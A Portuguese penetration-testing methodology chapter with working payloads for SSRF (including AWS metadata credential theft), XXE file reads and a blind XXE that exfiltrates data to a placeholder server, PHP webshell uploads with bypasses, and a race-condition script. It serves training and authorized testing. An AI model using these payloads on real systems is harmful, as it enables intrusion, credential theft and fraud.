## FASE 5 — Vetores Especializados (SSRF, XXE, File Upload, Lógica de Negócio)

**Tempo estimado:** 120-180 minutos
**Objetivo:** Testar os vetores que scanners automatizados NÃO detectam: SSRF (rede interna/cloud), XXE (leitura de arquivos), upload malicioso (RCE) e lógica de negócio (prejuízo financeiro).
**Por quê:** SSRF rouba credenciais AWS; XXE lê `/etc/passwd`; webshell dá takeover; lógica de negócio (race, cupom, IDOR) causa dano direto sem nenhum scanner acusar.

> **📡 Candidatos do recon (Módulo 01) e Fase 2 — de onde vêm:**
> - **SSRF:** filtre `09-descoberta/parametros.txt` por valores tipo URL (`url=`, `fetch=`, `image_url=`, `feed_url=`, `webhook=`) — esse parâmetro vem da Fase 2, que importou `08-alimentacao/params-web.txt` ← MANUAL-RECON `04-discovery/urls-com-parametros.txt`
> - **Upload:** `08-alimentacao/dirs-web.txt` com `/uploads`, `/files`, `/media`, `/attachments` → teste ali primeiro — arquivo gerado na Fase 1 a partir de MANUAL-RECON `04-discovery/gobuster-basico.txt`
> - **XML:** endpoints que aceitam `Content-Type: application/xml`/`text/xml`/`application/soap+xml` — procure-os em `08-alimentacao/endpoints-web.txt` (← MANUAL-RECON `04-discovery/js-endpoints.txt`)

---

## 5A: Server-Side Request Forgery (SSRF)

**Cenários típicos:** `GET /api/fetch?url=...` · `POST /api/import {"feed_url":...}` · webhook `{"url":...}` · avatar `{"image_url":...}`

### Passo 5A.1 — Teste Básico

```http
GET /api/fetch?url=http://127.0.0.1 HTTP/1.1
Host: evilcorp.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"response": "HTTP/1.1 200 OK\nServer: nginx/1.18.0\n..."}
```
Resposta com headers/conteúdo do servidor INTERNO → servidor fez o request.

**❌ Não vulnerável:** `400 Invalid URL` ou `200 {"response": "Connection refused"}`.

**Via POST:**
```http
POST /api/import HTTP/1.1
Content-Type: application/json

{"url": "http://127.0.0.1"}
```
Campo não existe → procure `feed_url`, `image_url`, `webhook_url`.

### Passo 5A.2 — Bypass de Filtros

| Técnica | Payload |
|---------|---------|
| IP decimal | `http://2130706433` (127.0.0.1) |
| IPv6 | `http://[::1]`, `http://[0:0:0:0:0:0:0:1]`, `http://[::ffff:127.0.0.1]` |
| Octal/Hex/curto | `http://0177.0.0.1`, `http://0x7f000001`, `http://127.1` |
| DNS próprio | `http://localtest.me` (resolve para 127.0.0.1) |
| Redirect | `http://httpbin.org/redirect-to?url=http://127.0.0.1` |
| Encoding | `http://127.0.0.1%0d%0a` |

**❌ Se der errado:** tudo bloqueado → Blind SSRF (Passo 5A.4); redirect ignorado → Out-of-Band via DNS.

### Passo 5A.3 — Cloud Metadata (alto impacto)

```http
# AWS
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP (headers: Metadata-Flavor: Google)
GET /api/fetch?url=http://metadata.google.internal/computeMetadata/v1/

# Azure (header: Metadata: true)
GET /api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**✅ Output esperado (AWS — lista de metadados):**
```
ami-id
hostname
instance-id
instance-type
local-ipv4
```
**Credencial IAM:** resposta contendo `AKIA...` (Access Key ID) → credenciais AWS completas → role da instância comprometida.

**❌ Se der errado:** 404 → não é cloud/metadata desabilitada; timeout → firewall no 169.254.169.254; 403 → IMDSv2 obrigatório (AWS) → tente via redirect.

### Passo 5A.4 — Blind SSRF (Out-of-Band)

1. Burp → **Collaborator** → **Copy to clipboard**
2. Payload: `GET /api/ping?host=COLLABORATOR_ID.burpcollaborator.net`
3. **Poll now** → conexão recebida → **Blind SSRF confirmado**

**❌ Se der errado:** nada chega → Collaborator inativo; WAF bloqueia domínio externo → subdomínio do próprio target.

### Passo 5A.5 — Port Scanning via SSRF

Teste `http://127.0.0.1:<porta>` para 22, 80, 443, 3306, 6379, 8080, 9200:

| Porta | Serviço | Impacto |
|-------|---------|---------|
| 22 | SSH | Acesso remoto |
| 80/443 | HTTP | Web server interno |
| 3306 | MySQL | Banco |
| 6379 | Redis | Cache (possível RCE) |
| 9200 | Elasticsearch | Dados expostos |

Respostas diferentes = portas abertas/fechadas; se iguais → meça timing.

---

## 5B: XML External Entity (XXE)

**Como funciona:** entidade externa no DTD substitui `&xxe;` pelo conteúdo do arquivo quando o parser processa o XML.

### Passo 5B.1 — Teste Básico

```http
POST /api/xml HTTP/1.1
Host: evilcorp.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<user>
  <name>test</name>
</user>
```

- **Erro de parsing ou 200 com dados → XML processado → testar XXE**
- `400 Invalid content type` → app não aceita XML → XXE impossível (procure outro endpoint/Content-Type)

### Passo 5B.2 — Leitura de Arquivo

```http
POST /api/xml HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"user": {"name": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."}}
```

**Outros arquivos:** `file:///etc/shadow` (hashes) · `file:///proc/self/environ` (env — chaves) · `file:///proc/self/cmdline` · `file:///home/user/.ssh/id_rsa` · `file:///var/www/html/config.php` (credenciais de banco)

**❌ Se der errado:** 500 → sintaxe do DTD; vazio → arquivo não existe; `&xxe;` literal → parser não expande entidades.

### Passo 5B.3 — Blind XXE (Out-of-Band)

1. Sirva um DTD malicioso (`python3 -m http.server 8080`) — `xxe.dtd`:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://SEU_SERVIDOR/?data=%data;'>">
%param;
```
2. Payload:
```http
POST /api/xml HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://SEU_SERVIDOR/xxe.dtd">
  %xxe;
]>
<user><name>test</name></user>
```
3. Logs recebendo `GET /?data=root:x:0:0:...` → **Blind XXE confirmado** (use Burp Collaborator como `SEU_SERVIDOR`).

**❌ Se der errado:** DTD não carrega → firewall → DNS exfil (`http://SUB.dnslog.cn`); WAF bloqueia DTD externo → tente SVG (Passo 5B.4).

### Passo 5B.4 — XXE via SVG Upload

```http
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="64" font-size="12">&xxe;</text>
</svg>
------boundary--
```
Acesse o SVG carregado → se mostrar `/etc/passwd` → XXE via upload.

**❌ Se der errado:** SVG rejeitado → renomeie `.svg.jpg`; sanitizado → volte ao XML POST.

---

## 5C: File Upload

### Passo 5C.1 — Upload de Webshell

**No Burp, intercepte o upload e substitua o conteúdo:**
```http
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/php

<?php echo system($_GET['cmd']); ?>
------boundary--
```
Acesse `https://evilcorp.com/uploads/shell.php?cmd=whoami`

**✅ Output esperado (VULNERÁVEL):** `www-data` → **RCE confirmado.**
**❌ Não vulnerável:** `403 File type not allowed` ou renomeado `shell.php.jpg` (extensão bloqueada, upload aceito).

### Passo 5C.2 — Bypass de Extensão

| Payload | Como funciona |
|---------|---------------|
| `shell.php.jpg` | Filtro só vê última extensão |
| `shell.php%00.jpg` | Null byte (PHP < 5.3.4) |
| `shell.pHp` | Case sensitivity |
| `shell.php5` / `shell.phtml` | Extensões PHP alternativas |
| `shell.php;.jpg` | IIS semicolon |
| `shell.php::$DATA` | Windows NTFS stream |
| `shell.php%0a` | Newline injection |

### Passo 5C.3 — Bypass de Content-Type

Mantenha `filename="shell.php"` mas envie `Content-Type: image/jpeg` — se o servidor valida só o header, aceita.

### Passo 5C.4 — Bypass de Magic Bytes

Adicione no início do conteúdo: `GIF89a` (GIF) · `\x89PNG` (PNG) · `\xFF\xD8\xFF` (JPG) · `%PDF-1.4` (PDF) — o servidor valida os primeiros bytes; a extensão `.php` continua executando.

### Passo 5C.5 — Polyglot File (imagem válida + PHP)

```bash
sudo apt install libimage-exiftool-perl -y
exiftool -Comment='<?php echo system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```
PHP embutido nos metadados EXIF; imagem continua válida.

**❌ Se der errado:** exiftool não instalado → `sudo apt install libimage-exiftool-perl -y`; não executa → servidor não processa `.jpg` como PHP → tente SVG.

### Passo 5C.6 — Upload de SVG para XSS

SVG com `<script>alert('XSS')</script>` → se exibido inline (não download) → XSS executado.

---

## 5D: Lógica de Negócio

> **Por que diferente:** race condition, bypass de workflow, preço e IDOR **não são detectados por scanner** — requerem pensar como o negócio funciona.

### Passo 5D.1 — Race Conditions

No Burp Repeater: envie um POST de transferência → clique direito → **Send group in parallel** → repita 5x.

```http
POST /api/transfer HTTP/1.1
Host: evilcorp.com
Content-Type: application/json

{"to": "account2", "amount": 1000}
```

**✅ Output esperado (VULNERÁVEL):**
```
Request 1: {"success": true, "balance": 5000}
Request 2: {"success": true, "balance": 4000}
... (todos processados — deveria bloquear no 2º ou 3º)
```

**Variantes:** cupom `{"coupon": "DESCONTO50", "total": 100}` ×5 paralelos (reuso) · estoque `{"product_id": 1, "quantity": 1}` com estoque=1 e 2+ requests aceitos.

**Script Python (10 threads):**
```python
import requests, threading

TARGET_URL = "https://evilcorp.com/api/transfer"
HEADERS = {"Content-Type": "application/json"}
PAYLOAD = {"to": "account2", "amount": 1000}
results = []

def send(i):
    try:
        r = requests.post(TARGET_URL, headers=HEADERS, json=PAYLOAD, timeout=10)
        results.append(r.status_code)
        print(f"[Thread {i}] {r.status_code} | {r.text[:100]}")
    except Exception as e:
        print(f"[Thread {i}] ERRO: {e}")

threads = [threading.Thread(target=send, args=(i,)) for i in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]

ok = sum(1 for s in results if s == 200)
print(f"Requests bem-sucedidos: {ok}/10")
print("[+] RACE CONDITION CONFIRMADA!" if ok > 1 else "[-] Não confirmada.")
```
Salve como `12-especializados/race_condition.py` → `python3 race_condition.py` (adicione `Authorization` se precisar).

**❌ Se der errado:** rate limit → `NUM_THREADS = 3`; só 1 processado → locks robustos → timing mais apertado (`event.set()`); `requests` ausente → `pip install requests`.

### Passo 5D.2 — Bypass de Workflow

```http
# Pular pagamento (aceitou status "paid" sem verificar → bypass)
POST /api/order/confirm
{"order_id": 123, "status": "paid", "payment_method": "credit_card"}

# Pular verificação de email
POST /api/account/activate
{"email": "user@test.com", "activated": true}

# Acessar etapa final direto
GET /api/checkout/step3
POST /api/checkout  {"step": 3, "data": {}}
```

**❌ Se der errado:** 403 → servidor valida etapa → manipule o parâmetro `step`; 500 → falta dado da etapa anterior → envie dados parciais.

### Passo 5D.3 — Manipulação de Preços

```http
POST /api/checkout
{"product_id": 1, "price": 0.01, "quantity": 1}
{"product_id": 1, "discount": 99.99, "price": 100.00}
{"product_id": 1, "currency": "IDR", "price": 100}
```
Preço/desconto/moeda aceitos pelo cliente → **manipulação confirmada.**

**❌ Se der errado:** 400 → preço validado no backend → envie `price` E `discount` juntos; aceitou mas cancelou → combine com race condition.

### Passo 5D.4 — Cupons

- **Reuso:** envie `{"coupon": "DESCONTO50", "total": 100}` várias vezes → marcado como usado?
- **Enumeração:** `WELCOME10, DESCONTO20, FRETEGRATIS, SAVE10, DISCOUNT50, ADMIN, TEST`
- **Bypass:** `{"coupon": "-50"}` (valor negativo) · `{"coupon": "VALIDO", "discount_amount": 9999}` (parâmetro extra)

### Passo 5D.5 — IDOR

```http
GET /api/orders/123            ← com token de outro usuário
GET /api/users/1
GET /api/users/2
GET /api/users/3               ← sequential ID prediction
GET /api/users/me              ← procure UUIDs de outros usuários no response
```

**❌ Se der errado:** tudo 403 → enumere IDs; IDs são UUIDs → procure UUIDs vazados em outros endpoints.

---

### Checklist da Fase 5

| # | Item | Arquivo gerado | ☑ |
|---|------|---------------|:---:|
| 1 | SSRF testado (básico + bypass) | `12-especializados/ssrf-test.txt` | [ ] |
| 2 | Cloud metadata testado | `12-especializados/ssrf-cloud.txt` | [ ] |
| 3 | Blind SSRF (OOB) | `12-especializados/ssrf-blind.txt` | [ ] |
| 4 | Port scanning via SSRF | `12-especializados/ssrf-ports.txt` | [ ] |
| 5 | XXE leitura de arquivo | `12-especializados/xxe-test.txt` | [ ] |
| 6 | Blind XXE (OOB) | `12-especializados/xxe-blind.txt` | [ ] |
| 7 | XXE via SVG upload | `12-especializados/xxe-svg.txt` | [ ] |
| 8 | Upload webshell + bypasses | `12-especializados/upload-test.txt` | [ ] |
| 9 | Polyglot / SVG XSS | `12-especializados/upload-polyglot.txt` | [ ] |
| 10 | Race condition testada | `12-especializados/race-transfer.txt` | [ ] |
| 11 | Bypass de workflow | `12-especializados/workflow-bypass.txt` | [ ] |
| 12 | Manipulação de preço/cupom | `12-especializados/price-tampering.txt` | [ ] |
| 13 | IDOR testado | `12-especializados/idor.txt` | [ ] |

### ✅ Sinal de sucesso:
- **≥ 1 vetor confirmado** entre: SSRF (rede interna/cloud), XXE (leitura), webshell (RCE), race/IDOR/preço
- **Mínimo para avançar:** race condition + IDOR testados (mesmo que negativos) + ≥ 1 de SSRF/XXE/upload

### ❌ Se falhou:
- Sem parâmetro de URL → SSRF impossível neste alvo; sem endpoint XML → XXE impossível
- Upload com whitelist estrita → polyglot; servidor sem PHP → tente JSP/Python
- Race com locks → timing mais apertado; IDOR com UUID → procure UUIDs vazados

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 5 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `ssrf-cloud.txt` | Fase 6 (Validação) | Confirmar acesso a cloud metadata |
| `ssrf-ports.txt` / `ssrf-blind.txt` | Fase 7 (Relatório) | Documentar rede interna / OOB |
| `xxe-test.txt` / `xxe-blind.txt` | Fase 7 | Documentar leitura de arquivo |
| `upload-test.txt` | Fase 6 | Confirmar webshell funcional |
| `race-transfer.txt` | Fase 6 | Confirmar race reproduzível |
| `idor.txt` / `price-tampering.txt` | Fase 7 | Documentar acesso não autorizado e prejuízo |

**Se completou tudo → Avance para [Fase 6 — Validação e Nuclei](12-fase6-validacao.md)**

---

## Mini-Checkpoints (1 lab por vetor)

1. **SSRF:** https://portswigger.net/web-security/server-side-request-forgery/lab-basic-ssrf-against-the-local-server → envie `http://127.0.0.1/admin` e execute o delete interno
2. **XXE:** https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files → confirme `/etc/passwd` na resposta
3. **Upload:** https://portswigger.net/web-security/file-upload/path-traversal/lab-web-shell-upload-via-path-traversal
4. **Race/IDOR:** labs de "insecure direct object reference" e "race conditions" do PortSwigger

**Se resolveu ≥ 2 → avance. Se não → revise 5A.2 (bypass SSRF), 5B.2 (XXE) e 5C.2 (upload).**
